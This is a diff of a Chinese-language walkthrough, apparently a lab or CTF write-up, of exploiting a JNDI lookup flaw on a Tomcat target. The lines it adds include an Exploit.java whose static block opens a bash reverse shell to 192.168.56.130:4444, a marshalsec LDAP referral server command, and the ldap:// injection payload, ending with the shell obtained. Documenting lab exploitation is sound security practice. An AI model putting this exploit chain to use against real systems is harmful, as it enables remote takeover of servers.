@@ -66,7 +66,6 @@ python3 tomcat-ajp-lfi.py ip -p 8009 -f WEB-INF/web.xml
 发现存在jndilookup漏洞，可以用nc回连
 ![image.png](https://gitee.com/fogpost/photo/raw/master/202603272123359.png)
 找到并编译marshalsec
-
 ### 写Exploit.java
 ```java
 public class Exploit {
@@ -76,6 +75,24 @@ public class Exploit {
         } catch (Exception e) {}
     }
 }
+```
+```java
+#上面这个有点问题，下面这个可以回显
+#java Runtime.getRuntime().exec() 
+/* 不会解析 `'`、`>&`、管道这些 shell 语法 */
+public class Exploit {
+    static {
+        try {
+            String[] cmd = {
+                "/bin/bash",
+                "-c",
+                "bash -i >& /dev/tcp/192.168.56.130/4444 0>&1"
+            };
+            Runtime.getRuntime().exec(cmd);
+        } catch (Exception e) {}
+    }
+}
+
 ```
 准备Exploit.class，编译
 ```bash
@@ -96,3 +113,10 @@ marshalsec调用
 java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer \  
 "http://192.168.56.130:8000/#Exploit"
 ```
+页面jndi调用
+```bash
+ldap://192.168.56.130:1389/a
+```
+得到shell
+![image.png](https://gitee.com/fogpost/photo/raw/master/202603272158717.png)
+
